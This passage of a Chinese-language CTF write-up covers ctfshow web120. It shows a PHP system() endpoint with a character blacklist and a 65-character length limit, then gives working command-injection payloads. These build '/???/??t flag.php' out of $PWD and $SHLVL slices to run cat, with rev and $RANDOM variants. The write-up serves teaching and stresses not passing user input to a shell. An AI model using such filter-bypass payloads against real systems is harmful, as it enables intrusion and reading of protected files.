- `SHLVL` 的值依赖环境：这题容器里是 2。换环境如果 `SHLVL` 变了，取 `a` 和 `t` 的偏移要跟着调整。

#### 为什么值得学

- 118、119 连着两题都在演示同一件事：**环境变量本身就是一份"字符表"**。配合 `${VAR:offset:length}` 和算术表达式，可以在"没有字母数字、没有 PATH"的情况下拼出想要的命令。
- 出题人只会"封词"（这题封了 `PATH`、`BASH`），但 `PWD`、`SHLVL`、`HOME`、`IFS` 这些变量永远在——黑名单式过滤封不完。
- 防守视角还是老结论：**不要在 `system()` 里拼接用户输入**。这题所有绕过都建立在"用户输入进了 shell"这一个前提上。

### web120

![image-20261108201349544](/assets/ctfshow-web-command-exec/image-20261108201349544.png)

**又加了两条：封 `HOME`，并且 payload 长度不能超过 65**

源码（页面直接 `highlight_file` 出来了）：

```php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like you'.'</div>';
        }else{
            echo '<div align="center">'.system($code).'</div>';
        }
    }else{
        echo '<div align="center">evil input</div>';
    }
}
```

相比 web119：

1. 禁词多了 **`HOME`**（所以 wp 里那条 `${HOME:0:1}` 的路在 web120 走不通了）
2. 新增 **长度限制 `strlen($code) > 65`** → 直接返回 `you are so long , I dont like you`

web119 那条 80 多字符的 payload 到这里会被长度挡住，必须压缩。

#### 思路：压缩语法，把 payload 压到 65 以内

三个省字符的技巧：

| 原来 | 压缩后 | 省 |
|---|---|---|
| `${PWD:${#}:${##}}` | `${PWD::${##}}` | 省略 offset 默认就是 0，省 3 字符 |
| `${PWD:~${SHLVL}:${#SHLVL}}` | `${PWD:~${SHLVL}:${##}}` | length 用 `${##}`(=1) 代替 `${#SHLVL}`，省 5 字符 |
| `${IFS}` | 直接写空格 | 空格没被禁，省 5 字符 |

payload（**62 个字符**，刚好在 65 以内）：

```
code=${PWD::${##}}???${PWD::${##}}??${PWD:~${SHLVL}:${##}} ????.???
```

拆开看：

| 片段 | 值 |
|---|---|
| `${PWD::${##}}` | `/`（`PWD[0:1]`） |
| `???` | 三个字符的目录名 |
| `${PWD::${##}}` | `/` |
| `??` | 两个字符的通配 |
| `${PWD:~${SHLVL}:${##}}` | `t`（`~2` = -3，`PWD[-3:1]`） |
| 空格 | 分隔参数 |
| `????.???` | `flag.php` |

拼成：

```
/???/??t flag.php
```

`/???/??t` 在根目录匹配到 `/bin/cat`（3 字符目录里以 `t` 结尾的三字符命令只有 `cat`），实际执行：

```
cat flag.php
```

直接出 flag。

#### wp 里另外两种写法

**① 用 `rev`（逆序输出）**

```
code=${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???
```

`${#IFS}` = 3（IFS 的字符串长度），所以 `${PWD:3:1}` = `r`，后面 `??` 补两个通配 → `/???/r??` 匹配 `/bin/rev`。rev 会把文件内容倒着输出，自己再反过来读一遍即可。

**② 用 `${#RANDOM}`**

```
code=${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???
```

`RANDOM` 是个 5 位数，`${#RANDOM}` = 5，用来拼 `/???/?????5` 这类模式——不同环境匹配到的命令不一定一样，属于"碰运气"的写法，不如前两种稳。

#### 为什么值得学

- **长度限制是另一个维度的过滤**：前面所有题都在过滤"内容"，这题第一次限制"长度"。绕法不是换更短的命令，而是**压缩语法**——省略默认参数、用更短的表达式（`${##}` 代替 `${#SHLVL}`）、能用字面量就别用变量（空格代替 `${IFS}`）。
- 三条 payload 都卡在 60~65 字符之间，说明出题人算过：正常写法全部超长，必须做语法压缩才能过。
- 防守视角：长度限制能提高利用门槛，但同样替代不了"不把用户输入交给 shell"这条根本原则。
